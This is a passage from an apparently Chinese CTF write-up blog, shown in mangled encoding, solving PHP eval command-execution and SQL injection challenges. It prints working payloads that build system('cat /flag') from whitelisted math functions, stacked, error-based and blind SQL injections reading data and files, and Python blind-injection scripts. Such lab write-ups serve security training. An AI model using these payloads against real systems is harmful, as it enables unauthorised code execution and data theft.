&#x27;.$content.&#x27;;&#x27;);&#125; å®¡è®¡ å¯ä»¥çœ‹åˆ°ä»£ç å¯¹äºæˆ‘ä»¬çš„ä¼ å‚è¿›è¡Œäº†å¦‚ä¸‹é™åˆ¶ï¼š é•¿åº¦é™åˆ¶&lt;80 é»‘åå•ç‰¹æ®Šå­—ç¬¦é™åˆ¶ æ­£åˆ™åŒ¹é…å­—ç¬¦é€šè¿‡ç™½åå•éªŒè¯ï¼Œæ¯”å¦‚ 12345abs(1)èƒ½è¿‡1abs()èƒ½è¿‡absa()ä¸èƒ½è¿‡abs(a)ä¸èƒ½è¿‡abs()aä¸èƒ½è¿‡ å…¶ä¸­æ­£åˆ™åŒ¹é…å­—ç¬¦ï¼š 1preg_match_all(&#x27;/[a-zA-Z_\\x7f-\\xff][a-zA-Z_0-9\\x7f-\\xff]*/&#x27;, $content, $used_funcs); æ˜¯å°†$contentå˜é‡ä¸­ä»¥å­—æ¯å¼€å¤´çš„å­—ç¬¦ä¸²ç»„æˆæ•°ç»„å‚¨å­˜åœ¨$used_funcså˜é‡ä¸­ã€‚ æŸ¥çœ‹$whitelistæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä¸¤ä¸ªè¿›åˆ¶è½¬æ¢å‡½æ•°ï¼š base_convert()ï¼šåœ¨ä»»æ„è¿›åˆ¶ä¹‹é—´è½¬æ¢æ•°å­—ï¼ˆ2 - 32 è¿›åˆ¶)ã€‚ dechex()ï¼šæŠŠåè¿›åˆ¶æ•°è½¬æ¢ä¸ºåå…­è¿›åˆ¶æ•°ã€‚ æˆ‘ä»¬çŸ¥é“32è¿›åˆ¶åŒ…æ‹¬0-9a-zç­‰å­—ç¬¦ã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡base_convert()å‡½æ•°åˆ©ç”¨è¿›åˆ¶è½¬æ¢æ„é€ ç‰¹å®šçš„å­—ç¬¦ä¸²ã€‚ æ„é€ payload æ–¹æ³•ä¸€ ç”±äºé•¿åº¦çš„é™åˆ¶ï¼Œè‚¯å®šæ˜¯è¦æ„é€ &#123;$_GET&#125;&#123;xx&#125;(&#123;$_GET&#125;&#123;yy&#125;)æ¥æ‰§è¡Œshellã€‚ hex2bin() å‡½æ•°ï¼šæŠŠåå…­è¿›åˆ¶å€¼çš„å­—ç¬¦ä¸²è½¬æ¢ä¸º ASCII å­—ç¬¦ã€‚ é¦–å…ˆæŠŠ$_GETè½¬æ¢ä¸º10è¿›åˆ¶è¡¨ç¤ºï¼š 12&gt;&gt;&gt; int(binascii.b2a_hex(b&#x27;_GET&#x27;), 16)1598506324 å†åˆ©ç”¨base_convertå‡½æ•°æ„é€ hex2binå‡½æ•°ï¼š 12php &gt; var_dump(base_convert(37907361743, 10, 36));string(7) &quot;hex2bin&quot; æœ€åï¼Œæˆ‘ä»¬å°±åˆ©ç”¨dechexå‡½æ•°æŠŠ10è¿›åˆ¶è¡¨ç¤ºçš„$_GETè½¬æ¢ä¸º16è¿›åˆ¶è¡¨ç¤ºï¼Œç„¶åä¼ å…¥hex2bin()å‡½æ•°ã€‚ æ‰€ä»¥æœ€åçš„payloadï¼š 1$pi&#x3D;base_convert(37907361743,10,36)(dechex(1598506324));($$pi)&#123;pi&#125;(($$pi)&#123;abs&#125;)&amp;pi&#x3D;system&amp;abs&#x3D;cat &#x2F;flag å¦å¤–ä¸€ç§å½¢å¼ï¼š 1$pi&#x3D;base_convert(37907361743,10,36)(dechex(1598506324));$&#123;$pi&#125;&#123;pi&#125;($&#123;$pi&#125;&#123;abs&#125;)&amp;pi&#x3D;system&amp;abs&#x3D;cat%20&#x2F;flag æ–¹æ³•äºŒ é€šè¿‡getallheaders()å‡½æ•°ï¼Œè¯»å–å†™å…¥HTTP request headerå­—æ®µçš„å€¼ã€‚ payloadçš„æ„é€ æ–¹å¼å’Œä¸Šé¢ä¸€æ · 1$pi&#x3D;base_convert,$pi(696468,10,36)($pi(8768397090111664438,10,30)()&#123;1&#125;) è§£é‡Šå¦‚ä¸‹ï¼š 12345base_convert(696468,10,36) &#x3D;&gt; &quot;exec&quot;$pi(8768397090111664438,10,30) &#x3D;&gt; &quot;getallheaders&quot;exec(getallheaders()&#123;1&#125;)&#x2F;&#x2F;æ“ä½œxxå’Œyyï¼Œä¸­é—´ç”¨é€—å·éš”å¼€ï¼Œechoéƒ½èƒ½è¾“å‡ºecho xx,yy NESTCTF2019 Love Math2 è€ƒç‚¹ ä»£ç å®¡è®¡ Fuzz è§£é¢˜ 12345678910111213141516171819202122232425262728&lt;?phperror_reporting(0);//å¬è¯´ä½ å¾ˆå–œæ¬¢æ•°å­¦ï¼Œä¸çŸ¥é“ä½ æ˜¯å¦çˆ±å®ƒèƒœè¿‡çˆ±flagif(!isset($_GET[&#x27;c&#x27;]))&#123; show_source(__FILE__);&#125;else&#123; //ä¾‹å­ c=20-1 $content = $_GET[&#x27;c&#x27;]; if (strlen($content) &gt;= 60) &#123; die(&quot;å¤ªé•¿äº†ä¸ä¼šç®—&quot;); &#125; $blacklist = [&#x27; &#x27;, &#x27;\\t&#x27;, &#x27;\\r&#x27;, &#x27;\\n&#x27;,&#x27;\\&#x27;&#x27;, &#x27;&quot;&#x27;, &#x27;`&#x27;, &#x27;\\[&#x27;, &#x27;\\]&#x27;]; foreach ($blacklist as $blackitem) &#123; if (preg_match(&#x27;/&#x27; . $blackitem . &#x27;/m&#x27;, $content)) &#123; die(&quot;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å­—ç¬¦&quot;); &#125; &#125; //å¸¸ç”¨æ•°å­¦å‡½æ•°http://www.w3school.com.cn/php/php_ref_math.asp $whitelist = [&#x27;abs&#x27;, &#x27;acos&#x27;, &#x27;acosh&#x27;, &#x27;asin&#x27;, &#x27;asinh&#x27;, &#x27;atan2&#x27;, &#x27;atan&#x27;, &#x27;atanh&#x27;, &#x27;bindec&#x27;, &#x27;ceil&#x27;, &#x27;cos&#x27;, &#x27;cosh&#x27;, &#x27;decbin&#x27; , &#x27;decoct&#x27;, &#x27;deg2rad&#x27;, &#x27;exp&#x27;, &#x27;expm1&#x27;, &#x27;floor&#x27;, &#x27;fmod&#x27;, &#x27;getrandmax&#x27;, &#x27;hexdec&#x27;, &#x27;hypot&#x27;, &#x27;is_finite&#x27;, &#x27;is_infinite&#x27;, &#x27;is_nan&#x27;, &#x27;lcg_value&#x27;, &#x27;log10&#x27;, &#x27;log1p&#x27;, &#x27;log&#x27;, &#x27;max&#x27;, &#x27;min&#x27;, &#x27;mt_getrandmax&#x27;, &#x27;mt_rand&#x27;, &#x27;mt_srand&#x27;, &#x27;octdec&#x27;, &#x27;pi&#x27;, &#x27;pow&#x27;, &#x27;rad2deg&#x27;, &#x27;rand&#x27;, &#x27;round&#x27;, &#x27;sin&#x27;, &#x27;sinh&#x27;, &#x27;sqrt&#x27;, &#x27;srand&#x27;, &#x27;tan&#x27;, &#x27;tanh&#x27;]; preg_match_all(&#x27;/[a-zA-Z_\\x7f-\\xff][a-zA-Z_0-9\\x7f-\\xff]*/&#x27;, $content, $used_funcs); foreach ($used_funcs[0] as $func) &#123; if (!in_array($func, $whitelist)) &#123; die(&quot;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å‡½æ•°&quot;); &#125; &#125; //å¸®ä½ ç®—å‡ºç­”æ¡ˆ eval(&#x27;echo &#x27;.$content.&#x27;;&#x27;);&#125; å’Œä¸Šé¢çš„é‚£é“é¢˜åŸºæœ¬ä¸Šæ˜¯ä¸€æ ·çš„ï¼Œä½†æ˜¯é™åˆ¶æ›´ä¸ºä¸¥æ ¼ï¼Œå‚æ•°é•¿åº¦å¿…é¡»å°äº60ï¼Œæ‰€ä»¥é‚£é“é¢˜çš„ä¸¤ä¸ªæ–¹æ³•éƒ½ä¸èƒ½ç”¨ï¼Œè¿™é‡Œå†ä»‹ç»ä¸€ç§Fuzzçš„è„šæœ¬ã€‚ 1234567891011&lt;?php$payload = [&#x27;abs&#x27;, &#x27;acos&#x27;, &#x27;acosh&#x27;, &#x27;asin&#x27;, &#x27;asinh&#x27;, &#x27;atan2&#x27;, &#x27;atan&#x27;, &#x27;atanh&#x27;, &#x27;bindec&#x27;, &#x27;ceil&#x27;, &#x27;cos&#x27;, &#x27;cosh&#x27;, &#x27;decbin&#x27; , &#x27;decoct&#x27;, &#x27;deg2rad&#x27;, &#x27;exp&#x27;, &#x27;expm1&#x27;, &#x27;floor&#x27;, &#x27;fmod&#x27;, &#x27;getrandmax&#x27;, &#x27;hexdec&#x27;, &#x27;hypot&#x27;, &#x27;is_finite&#x27;, &#x27;is_infinite&#x27;, &#x27;is_nan&#x27;, &#x27;lcg_value&#x27;, &#x27;log10&#x27;, &#x27;log1p&#x27;, &#x27;log&#x27;, &#x27;max&#x27;, &#x27;min&#x27;, &#x27;mt_getrandmax&#x27;, &#x27;mt_rand&#x27;, &#x27;mt_srand&#x27;, &#x27;octdec&#x27;, &#x27;pi&#x27;, &#x27;pow&#x27;, &#x27;rad2deg&#x27;, &#x27;rand&#x27;, &#x27;round&#x27;, &#x27;sin&#x27;, &#x27;sinh&#x27;, &#x27;sqrt&#x27;, &#x27;srand&#x27;, &#x27;tan&#x27;, &#x27;tanh&#x27;];for($k=1;$k&lt;=sizeof($payload);$k++)&#123; for($i = 0;$i &lt; 9; $i++)&#123; for($j = 0;$j &lt;=9;$j++)&#123; $exp = $payload[$k] ^ $i.$j; echo($payload[$k].&quot;^$i$j&quot;.&quot;==&gt;$exp&quot;); echo &quot;&lt;br /&gt;&quot;; &#125; &#125;&#125; ä¸»è¦ç›®çš„å°±æ˜¯æƒ³fuzzå‡º_GETå­—ç¬¦ä¸²ã€‚å¯ä»¥æŠŠè¿™ä¸ªå­—ç¬¦ä¸²æ‹†åˆ†æˆä¸¤æ®µã€‚å…ˆæŸ¥æ‰¾_G 1234567$ php fuzz.php | grep _Gis_finite^64&#x3D;&#x3D;&gt;_Gis_infinite^64&#x3D;&#x3D;&gt;_Gis_nan^64&#x3D;&#x3D;&gt;_Gmt_getrandmax^23&#x3D;&#x3D;&gt;_Gmt_rand^23&#x3D;&#x3D;&gt;_Gmt_srand^23&#x3D;&#x3D;&gt;_G å†æ¥æŸ¥æ‰¾ET 12345$ php fuzz.php | grep ETrad2deg^75&#x3D;&#x3D;&gt;ETrand^75&#x3D;&#x3D;&gt;ETtan^15&#x3D;&#x3D;&gt;ETtanh^15&#x3D;&#x3D;&gt;ET é€‰æ‹©å‡½æ•°åæœ€çŸ­çš„å³å¯ã€‚æœ€ç»ˆçš„payloadï¼š 1$pi&#x3D;(is_nan^(6).(4)).(tan^(1).(5));$pi&#x3D;$$pi;$pi&#123;0&#125;($pi&#123;1&#125;)&amp;0&#x3D;system&amp;1&#x3D;cat &#x2F;flag æˆ–è€… 1$pi&#x3D;(is_nan^(6).(4)).(tan^(1).(5));$&#123;$pi&#125;&#123;0&#125;($&#123;$pi&#125;&#123;1&#125;)&amp;0&#x3D;system&amp;1&#x3D;cat%20&#x2F;flag","tags":[{"name":"CTF","slug":"CTF","permalink":"http://ca0y1h.top/tags/CTF/"}],"categories":[{"name":"CTF","slug":"CTF","permalink":"http://ca0y1h.top/categories/CTF/"},{"name":"å‘½ä»¤æ‰§è¡Œ","slug":"CTF/å‘½ä»¤æ‰§è¡Œ","permalink":"http://ca0y1h.top/categories/CTF/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"}]},{"title":"buuctfåˆ·é¢˜â€”â€”SQLæ³¨å…¥","date":"2020-08-18T09:58:19.000Z","path":"Web_security/ctf_writeup/7.buuctfåˆ·é¢˜â€”â€”SQLæ³¨å…¥/","text":"å¼ºç½‘æ¯ 2019 éšä¾¿æ³¨ è€ƒç‚¹ å †å æ³¨å…¥ é¢„ç¼–è¯‘è¯­å¥ è§£é¢˜ æ–¹æ³•ä¸€ åˆ¤æ–­æ³¨å…¥ç‚¹ ä¹‹åè¿›è¡Œunionè”åˆæ³¨å…¥çš„æ—¶å€™å‘ç°äº†æ­£åˆ™è¿‡æ»¤ å‡ ä¹è¿‡æ»¤äº†æˆ‘ä»¬æ‰€æœ‰èƒ½ç”¨åˆ°çš„è¯­å¥ å†å°è¯•å †å æ³¨å…¥ï¼Œ show tables æŸ¥è¯¢å½“å‰æ•°æ®åº“ä¸­çš„è¡¨å‘ç°äº†ä¸¤ä¸ªè¡¨ çœ‹ä¸‹ä¸¤ä¸ªè¡¨çš„ç»“æ„å­—æ®µ 1234&#x2F;&#x2F;æŸ¥çœ‹wordsè¡¨çš„å­—æ®µ&#39;;show columns from words;# &#x2F;&#x2F;æŸ¥çœ‹1919810931114514è¡¨çš„å­—æ®µ&#39;;show columns from &#96;1919810931114514&#96;;# éªšå§¿åŠ¿å¼€å§‹äº†ï¼Œæˆ‘ä»¬é»˜è®¤æŸ¥è¯¢çš„è¡¨æ˜¯wordè¡¨ï¼Œé‚£ä¹ˆå°±å¯ä»¥é€šè¿‡renameè¯­å¥æŠŠwordsè¡¨çš„è¡¨åæ”¹æˆwords1ï¼ŒæŠŠ1919810931114514çš„è¡¨åæ”¹æˆwordsï¼Œç„¶åå†ç”¨alterè¯­å¥æŠŠflagå­—æ®µåæ”¹æˆidå³å¯ã€‚ã€‚ã€‚ğŸ˜‚ payloadï¼š 11&#39;;RENAME TABLE &#96;words&#96; TO &#96;words1&#96;;RENAME TABLE &#96;1919810931114514&#96; TO &#96;words&#96;;ALTER TABLE &#96;words&#96; CHANGE &#96;flag&#96; &#96;id&#96; VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;# ç”¨ 1â€² or â€˜1â€™=â€™1 è®¿é—®ä¸€ä¸‹ æ–¹æ³•äºŒ ä½¿ç”¨MySQLé¢„å¤„ç†è¯­å¥ç»•è¿‡è¿‡æ»¤ã€‚ æˆ‘ä»¬è¿›è¡Œæ„é€ è¿™ä¸ªè¯­å¥: 123set @a&#x3D;concat(&quot;sel&quot;,&quot;ect flag from &#96;1919810931114514&#96;&quot;);prepare sql from @aexecute sql; payload: 11&#39;;set @a&#x3D;concat(&quot;sel&quot;,&quot;ect flag from &#96;1919810931114514&#96;&quot;);prepare sql from @a;execute sql;# å¤§å°å†™ç»•è¿‡ï¼š 11&#39;;sEt @a&#x3D;concat(&quot;sel&quot;,&quot;ect flag from &#96;1919810931114514&#96;&quot;);Prepare hello from @a;execute hello;# CISCN2019 Hack world è€ƒç‚¹ Boolç›²æ³¨ Pythonè„šæœ¬ç¼–å†™ å¼‚æˆ–æ³¨å…¥ è§£é¢˜ æ¯æ¬¡ç¢°åˆ°è¿™ç§SQLæ³¨å…¥çš„é¢˜ç›®éƒ½æ²¡å¤ªå¤šæ€è·¯ã€‚ æ ¹æ®1å’Œ2è¿”å›ç»“æœçš„ä¸åŒï¼Œå¯èƒ½æ˜¯boolç›²æ³¨ï¼Œ()æ²¡æœ‰è¿‡æ»¤ï¼Œå¯ä»¥ä½¿ç”¨å¤§éƒ¨åˆ†å‡½æ•°ã€‚ ç©ºæ ¼ç»•è¿‡ï¼š%09 %0a %0b %0c %0d /**/ /*!*/æˆ–è€…ç›´æ¥tab ä»»ä½•å¯ä»¥è®¡ç®—å‡ºç»“æœçš„è¯­å¥ï¼Œéƒ½å¯ä»¥ç”¨æ‹¬å·åŒ…å›´èµ·æ¥ã€‚è€Œæ‹¬å·çš„ä¸¤ç«¯ï¼Œå¯ä»¥æ²¡æœ‰å¤šä½™çš„ç©ºæ ¼ã€‚ payloadç¤ºä¾‹ï¼š 1if(ascii(substr((select(flag)from(flag)),1,1))&#x3D;ascii(&#39;f&#39;),1,2) å¦‚æœç­‰å·æˆç«‹çš„è¯ï¼Œé‚£ä¹ˆå°±è¿”å›Hello, glzjin wants a girlfriend.ï¼Œå¦‚æœä¸æˆç«‹é‚£ä¹ˆå°±è¿”å›Do you want to be my girlfriend?ï¼Œç”¨äºŒåˆ†æ³•ç¼–å†™ç›²æ³¨è„šæœ¬ï¼š 12345678910111213141516171819202122232425from time import sleepimport requestsurl = &#x27;http://a9475c38-821c-4b23-aa96-87730f0863fe.node3.buuoj.cn/index.php&#x27;flag = &#x27;Hello, glzjin wants a girlfriend.&#x27;result = &#x27;&#x27;for i in range(1, 50): sleep(1) high = 127 low = 32 mid = (high + low) // 2 while high &gt; low: payload = &quot;if(ascii(substr((select(flag)from(flag)),&#123;index&#125;,1))&gt;&#123;char&#125;,1,2)&quot;.format(index=i, char=mid) data = &#123;&#x27;id&#x27;: payload&#125; response = requests.post(url=url, data=data) if flag in response.text: low = mid + 1 else: high = mid mid = (high + low) // 2 result += chr(mid) print(result) æ‹“å±•ï¼šCTFå‡ ç§ç›²æ³¨çš„æ‰‹æ³• https://www.anquanke.com/post/id/160584#h2-0 CISCN2019 ååŒ—èµ›åŒº Day1 Web5 CyberPunk è€ƒç‚¹ æ–‡ä»¶åŒ…å« äºŒæ¬¡æ³¨å…¥ æŠ¥é”™æ³¨å…¥ è§£é¢˜ æŸ¥çœ‹æºç æç¤ºindex.phpæœ‰fileå‚æ•°ï¼Œå¯ä»¥ä½¿ç”¨ä¼ªåè®®æ–‡ä»¶åŒ…å«ã€‚ index.php 1234567891011121314&lt;?phpini_set(&#x27;open_basedir&#x27;, &#x27;/var/www/html/&#x27;);// $file = $_GET[&quot;file&quot;];$file = (isset($_GET[&#x27;file&#x27;]) ? $_GET[&#x27;file&#x27;] : null);if (isset($file))&#123; if (preg_match(&quot;/phar|zip|bzip2|zlib|data|input|%00/i&quot;,$file)) &#123; echo(&#x27;no way!&#x27;); exit; &#125; @include($file);&#125;?&gt; confirm.phpä¸­å¯¹è¾“å…¥çš„usernameå’Œphoneéƒ½è¿›è¡Œäº†è¿‡æ»¤äº†ï¼Œä½†æ˜¯å¿½ç•¥äº†addresså­—æ®µã€‚ 12345678910111213141516171819202122232425262728293031323334353637&lt;?phprequire_once &quot;config.php&quot;;//var_dump($_POST);if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;address&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))&#123; $msg = &#x27;&#x27;; $pattern = &#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;; $user_name = $_POST[&quot;user_name&quot;]; $address = $_POST[&quot;address&quot;]; $phone = $_POST[&quot;phone&quot;]; if (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123; $msg = &#x27;no sql inject!&#x27;; &#125;else&#123; $sql = &quot;select * from `user` where `user_name`=&#x27;&#123;$user_name&#125;&#x27; and `phone`=&#x27;&#123;$phone&#125;&#x27;&quot;; $fetch = $db-&gt;query($sql); &#125; if($fetch-&gt;num_rows&gt;0) &#123; $msg = $user_name.&quot;å·²æäº¤è®¢å•&quot;; &#125;else&#123; $sql = &quot;insert into `user` ( `user_name`, `address`, `phone`) values( ?, ?, ?)&quot;; $re = $db-&gt;prepare($sql); $re-&gt;bind_param(&quot;sss&quot;, $user_name, $address, $phone); $re = $re-&gt;execute(); if(!$re) &#123; echo &#x27;error&#x27;; print_r($db-&gt;error); exit; &#125; $msg = &quot;è®¢å•æäº¤æˆåŠŸ&quot;; &#125;&#125; else &#123; $msg = &quot;ä¿¡æ¯ä¸å…¨&quot;;&#125;?&gt; åœ¨change.phpä»æ•°æ®åº“ä¸­å–å‡ºäº†åœ¨confirm.phpè¾“å…¥çš„addressï¼Œè¿™æ ·å°±é€ æˆäº†äºŒæ¬¡æ³¨å…¥ã€‚ 1234567891011121314151617181920212223242526272829303132333435&lt;?phprequire_once &quot;config.php&quot;;if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;address&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))&#123; $msg = &#x27;&#x27;; $pattern = &#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;; $user_name = $_POST[&quot;user_name&quot;]; $address = addslashes($_POST[&quot;address&quot;]); $phone = $_POST[&quot;phone&quot;]; if (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123; $msg = &#x27;no sql inject!&#x27;; &#125;else&#123; $sql = &quot;select * from `user` where `user_name`=&#x27;&#123;$user_name&#125;&#x27; and `phone`=&#x27;&#123;$phone&#125;&#x27;&quot;; $fetch = $db-&gt;query($sql); &#125; if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0)&#123; $row = $fetch-&gt;fetch_assoc(); $sql = &quot;update `user` set `address`=&#x27;&quot;.$address.&quot;&#x27;, `old_address`=&#x27;&quot;.$row[&#x27;address&#x27;].&quot;&#x27; where `user_id`=&quot;.$row[&#x27;user_id&#x27;]; $result = $db-&gt;query($sql); if(!$result) &#123; echo &#x27;error&#x27;; print_r($db-&gt;error); exit; &#125; $msg = &quot;è®¢å•ä¿®æ”¹æˆåŠŸ&quot;; &#125; else &#123; $msg = &quot;æœªæ‰¾åˆ°è®¢å•!&quot;; &#125;&#125;else &#123; $msg = &quot;ä¿¡æ¯ä¸å…¨&quot;;&#125;?&gt; æ€è·¯å·²ç»å¾ˆæ˜ç¡®äº†ï¼Œå…ˆåœ¨æäº¤è®¢å•çš„æ—¶å€™çš„åœ°å€å¤„æ„é€ ä¸€ä¸ªç”¨æ¥æ³¨å…¥çš„è¯­å¥ï¼Œç„¶åå†ä¿®æ”¹ä¸€ä¸‹è®¢å•ï¼Œå®Œæˆæ³¨å…¥ã€‚åˆ©ç”¨updatexmlå‡½æ•°å› ä¸ºæ ¼å¼çš„é”™è¯¯ï¼Œå›æ˜¾äº†å…³é”®ä¿¡æ¯çš„åŸç†ï¼Œæ„é€ å¦‚ä¸‹æŠ¥é”™æ³¨å…¥æ”»å‡»è¯­å¥ï¼š 121&#39; where user_id&#x3D;updatexml(1,concat(0x7e,(select substr(load_file(&#39;&#x2F;flag.txt&#39;),1,20)),0x7e),1)#&#x2F;&#x2F;å¦‚æœflagå¤ªé•¿çš„è¯ï¼Œé€šè¿‡æ”¹å˜substrçš„èµ·å§‹å€¼ï¼Œå°±å¯ä»¥æŠŠflagå‰©ä¸‹çš„éƒ¨åˆ†æŸ¥å‡ºæ¥ SUCTF2019 EasySQL è€ƒç‚¹ å †å æ³¨å…¥ sql_modeå‚æ•° Oracle åœ¨ç¼ºçœæƒ…å†µä¸‹æ”¯æŒä½¿ç”¨ &quot; || &quot;è¿æ¥å­—ç¬¦ä¸² ï¼Œ ä½†æ˜¯åœ¨MySQLä¸­ç¼ºçœä¸æ”¯æŒ ï¼ŒMySQL ç¼ºçœä½¿ç”¨ CONCAT ç³»åˆ—å‡½æ•°æ¥è¿æ¥å­—ç¬¦ä¸² è§£é¢˜ FUZZåå‘ç°è¿‡æ»¤äº†ä¸å°‘å…³é”®å­—ï¼Œå¯ä»¥è¾“å…¥å•ä¸ªæ•°å­—ï¼Œè¾“å‡ºçš„è¯­å¥åº”è¯¥æ˜¯ç”¨var_dump()å‡½æ•°ï¼Œè€ƒè™‘å †å æ³¨å…¥ã€‚ è¯»å–å½“å‰æ•°æ®è¡¨ï¼š ä½†æ˜¯Flagä¹Ÿè¢«è¿‡æ»¤äº†ã€‚æ®è¯´æ¯”èµ›çš„æ—¶å€™æ³„éœ²æºç äº†ã€‚ã€‚ã€‚ è¿æ¥æ•°æ®åº“å¹¶ä»URLè·å–å‚æ•° å¯¹è·å–çš„å‚æ•°è¿›è¡Œå¤„ç†åå¸¦å…¥æ•°æ®åº“æŸ¥è¯¢ ï¼Œ å¹¶ä¸”è¿”å›ç»“æœ å…¶å®ä¸»è¦å°±æ˜¯ SQL æŸ¥è¯¢è¯­å¥ : select &quot;.$post['query'].&quot;||flag from Flag&quot;; å¯ä»¥é€šè¿‡ä¿®æ”¹ sql_mode æ¨¡å¼ : PIPES_AS_CONCAT æ¥å®ç°å°† &quot; || &quot;è§†ä¸º å­—ç¬¦ä¸²è¿æ¥ç¬¦ è€Œé æˆ– è¿ç®—ç¬¦ã€‚ payloadï¼š1;set sql_mode=PIPES_AS_CONCAT;SELECT 1 æ‹¼æ¥åå°±å˜æˆäº† SELECT 1;set sql_mode=PIPES_AS_CONCAT;SELECT 1 || flag FROM Flag éé¢„æœŸ Payload : \\*,1 æ‹¼æ¥åå°±å˜æˆäº† SELECT \\* ,1 || flag FROM Flag æå®¢å¤§æŒ‘æˆ˜ 2019 EasySQL æå®¢å¤§æŒ‘æˆ˜ 2019 LoveSQL æå®¢å¤§æŒ‘æˆ˜ 2019 BabySQL æå®¢å¤§æŒ‘æˆ˜2019 HardSQL è€ƒç‚¹ MySQLæŠ¥é”™æ³¨å…¥ è§£é¢˜ å…³é”®è¯FUZZä¸€ä¸‹å‘ç°è¿‡æ»¤äº†ç©ºæ ¼ï¼Œorï¼Œupdateï¼Œhandlerï¼Œ/ï¼Œ=ç­‰å¸¸è§å­—ç¬¦ï¼Œè¿™ä¸ªæ—¶å€™å¯ä»¥è¯•ä¸€ä¸‹æŠ¥é”™æ³¨å…¥ï¼Œç›´æ¥ä¸Špayloadï¼š çˆ†æ•°æ®åº“å 12admin&#39;^extractvalue(1,concat(0x7e,(select(database()))))#&#x2F;&#x2F; geek çˆ†æ•°æ®è¡¨å 12admin&#39;^extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database()))))#&#x2F;&#x2F; H4rDsq1 çˆ†åˆ—å 12admin&#39;^extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#39;H4rDsq1&#39;))))#&#x2F;&#x2F; id,username,password çˆ†å€¼ 12admin&#39;^extractvalue(1,concat(0x7e,(select(password)from(H4rDsq1))))#&#x2F;&#x2F; flag&#123;d994a91e-d9d6-4901-b025-b8 å‘ç°æ˜¾ç¤ºä¸å®Œå…¨ï¼Œsubstr()å‡½æ•°æ— æ•ˆï¼Œå¯ä»¥ä½¿ç”¨reverse()å‡½æ•°ç¿»è½¬ï¼š 12admin&#39;^extractvalue(1,concat(0x7e,(select(reverse((select(password)from(H4rDsq1)))))))#&#x2F;&#x2F; &#125;007f9f56108b-520b-1094-6d9d-e1 ä¹Ÿå¯ä»¥ä½¿ç”¨left()å’Œright()å‡½æ•°ç»•è¿‡ï¼š 12admin&#39;^extractvalue(1,concat(0x7e,(select(left(password,30))from(H4rDsq1))))#&#x2F;&#x2F; flag&#123;d994a91e-d9d6-4901-b025-b 12admin&#39;^extractvalue(1,concat(0x7e,(select(right(password,30))from(H4rDsq1))))#&#x2F;&#x2F; e-d9d6-4901-b025-b80165f9f700&#125; æå®¢å¤§æŒ‘æˆ˜2019 FinalSQL è€ƒç‚¹ MySQL regxç›²æ³¨ è§£é¢˜ è¿›å…¥é¢˜ç›®ç»™äº†å‡ ä¸ªhintï¼Œé¦–å…ˆç¡®å®šæ˜¯ç›²æ³¨ï¼Œå½“id=6çš„æ—¶å€™å›æ˜¾Clever! But not this table.ã€‚ ç™»å½•æ¡†ç»è¿‡æµ‹è¯•åæ²¡æœ‰å¯æ³¨å…¥çš„ç‚¹ï¼Œå°è¯•idå‚æ•°åå‘ç°è¿‡æ»¤ç©ºæ ¼ï¼Œ/**/ä»¥åŠifç­‰å…³é”®å­—ã€‚æµ‹è¯•æ³¨å…¥ç‚¹ï¼š 16^length(database())&gt;0 å›æ˜¾Clever! But not this table. 16^length(database())&lt;0 å›æ˜¾ERROR ç”±äºè¿‡æ»¤äº†ifå…³é”®å­—ï¼Œæ‰€ä»¥è¦ä½¿ç”¨regexç›²æ³¨ï¼Œç¤ºä¾‹ï¼š 16^(ascii(substr((select(group_concat(schema_name))from(information_schema.schemata)),1,1))&gt;0)^1 ç¡®å®šæ³¨å…¥ç‚¹å’Œpayloadå½¢å¼åå¼€å§‹ç¼–å†™ç›²æ³¨è„šæœ¬ï¼š 12345678910111213141516171819202122232425262728import requestsfrom time import sleepurl = &quot;http://410b10a4-249a-4d9b-b1df-03f557672625.node3.buuoj.cn/search.php?id=6&quot;flag = &quot;Clever! But not this table.&quot;result = &quot;&quot;for i in range(1, 1000): sleep(0.5) low = 32 high = 127 while high &gt; low: mid = (high + low) // 2 #payload = &quot;^(ascii(substr((select(group_concat(schema_name))from(information_schema.schemata)),&#123;index&#125;,1))&gt;&#123;char&#125;)^1&quot; #payload = &quot;^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=&#x27;geek&#x27;),&#123;index&#125;,1))&gt;&#123;char&#125;)^1&quot; #payload = &quot;^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;Flaaaaag&#x27;)),&#123;index&#125;,1))&gt;&#123;char&#125;)^1&quot; payload = &quot;^(ascii(substr((select(group_concat(password))from(F1naI1y)),&#123;index&#125;,1))&gt;&#123;char&#125;)^1&quot; response = requests.get(url + payload.format(index=i, char=mid)) if flag in response.text: low = mid + 1 else: high = mid if low != 32: result += chr(low) else: break print(result) GXYCTF2019 BabysqliV1 åŸé¢˜ç›®æè¿°ï¼šåˆšå­¦å®Œsqliï¼Œæˆ‘æ‰çŸ¥é“ä¸‡èƒ½å£ä»¤è¿™ä¹ˆå±é™©ï¼Œè¿˜å¥½æˆ‘è¿›è¡Œäº†é˜²æŠ¤ï¼Œè¿˜ç”¨md5å“ˆå¸Œäº†å¯†ç ï¼ (BUUCTFæ²¡æœ‰æç¤ºå•Š!!!) è€ƒç‚¹ SQLè”åˆæŸ¥è¯¢ è§£é¢˜ å…ˆFUZZä¸€æ³¢è¿‡æ»¤äº†æŸäº›å­—ç¬¦ï¼Œå¸¸è§„çš„æ³¨å…¥éƒ½æ²¡èƒ½passï¼ŒæŸ¥çœ‹æºç å‘ç°ä¸€ä¸ªsearch.php 